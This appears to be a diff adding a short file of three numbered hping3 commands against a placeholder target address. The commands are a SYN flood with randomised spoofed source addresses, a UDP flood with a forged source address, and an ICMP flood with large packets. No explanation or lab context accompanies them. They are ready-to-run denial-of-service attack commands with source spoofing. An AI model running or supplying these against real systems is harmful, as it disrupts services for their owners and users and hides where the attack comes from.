@@ -1,0 +1,5 @@
+1: hping3 -S TARGET_IP -c 10000 --flood --rand-source
+
+2: hping3 --udp TARGET_IP -c 9000 -i u10000 -a 1.2.3.4
+
+3: hping3 --icmp TARGET_IP -c 11000 -d 1024 -i u13333
